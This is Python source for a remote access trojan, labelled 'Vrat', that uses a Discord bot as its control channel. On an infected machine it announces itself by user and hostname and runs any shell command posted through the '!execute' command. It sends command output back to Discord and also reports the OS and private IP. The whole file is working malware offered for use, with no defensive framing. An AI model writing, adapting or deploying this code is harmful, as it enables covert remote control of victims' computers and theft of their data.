from discord.ext import commands
import socket
import discord
import platform
import subprocess
import os

# Vrat - A simple RAT with discord integration

# Discord bot setup

prefix = "!"
intents = discord.Intents.all()
token = "YOUR_TOKEN_HERE"

bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=None)

# Generate uniqe identifier for this session

try:
    node_id = f"{os.getlogin()}@{socket.gethostname()}"
except:
    node_id = f"unknown@{socket.gethostname()}"

# Discord bot events

@bot.event
async def on_ready():
    for channel in bot.get_all_channels():
        if isinstance(channel, discord.TextChannel):
            await channel.send(f"New Session Online: `{node_id}`")
            break

# Discord bot commands

current_dir = os.getcwd()

@bot.command(name="execute")
async def execute_command(ctx, target, *, command):
    global current_dir

    if target.lower() != node_id.lower() and target.lower() != "all":
        return

    try:
        if command.startswith("cd "):
            path = command[3:].strip()
            new_path = os.path.join(current_dir, path)
            if os.path.isdir(new_path):
                current_dir = os.path.abspath(new_path)
                await ctx.send(f"[`{node_id}`] Changed directory to `{current_dir}`")
            else:
                await ctx.send(f"[`{node_id}`] Directory does not exist: `{path}`")
            return

        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            cwd=current_dir
        )

        output = (result.stdout + result.stderr).strip()

        if output:
            chunk_size = 1800
            for i in range(0, len(output), chunk_size):
                await ctx.send(f"[{node_id}]\n```\n{output[i:i+chunk_size]}\n```")
        else:
            await ctx.send(f"[{node_id}] Command executed.")

    except Exception as e:
        await ctx.send(f"[{node_id}] Error: `{str(e)}`")

@bot.command(name="info")
async def get_info(ctx, target):

    if target.lower() != node_id.lower() and target.lower() != "all":
        return

    info = (
        f"Session ID: `{node_id}`\n"
        f"OS: `{platform.system()} {platform.release()}`\n"
        f"Private IP: `{socket.gethostbyname(socket.gethostname())}`\n"
    )
    await ctx.send(info)

bot.run(token)
